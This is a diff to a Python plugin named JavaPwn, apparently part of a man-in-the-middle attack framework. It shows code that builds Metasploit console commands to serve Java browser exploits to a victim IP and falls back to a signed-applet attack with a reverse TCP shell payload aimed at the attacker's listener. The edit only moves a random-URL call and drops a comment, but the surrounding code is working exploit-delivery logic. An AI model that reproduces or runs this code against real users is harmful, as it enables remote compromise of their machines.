@@ -142,10 +142,8 @@ class JavaPwn(BrowserProfiler, Plugin):
                                     self.injectWait(msf, url, vic_ip)
 
                         else:  #here we setup the exploit
-                            rand_url = self.rand_url()  #generate a random url
                             rand_port = random.randint(1000, 65535)  #generate a random port for the payload listener
-
-
+                            rand_url = self.rand_url()
                             #generate the command string to send to the virtual console
                             #new line character very important as it simulates a user pressing enter
                             cmd = "use exploit/multi/browser/%s\n" % exploit
@@ -165,10 +163,12 @@ class JavaPwn(BrowserProfiler, Plugin):
                         logging.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
                         logging.info("%s >> falling back to the signed applet attack" % vic_ip)
 
+                        rand_url = self.rand_url()
+
                         cmd = "use exploit/multi/browser/java_signed_applet\n"
                         cmd += "set SRVPORT %s\n" % self.msfport
                         cmd += "set URIPATH %s\n" % rand_url
-                        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"  #chose this payload because it can be upgraded to a full-meterpreter (plus its multi-platform! Yay java!)
+                        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"
                         cmd += "set LHOST %s\n" % self.msfip
                         cmd += "set LPORT %s\n" % rand_port
                         cmd += "exploit -j\n"
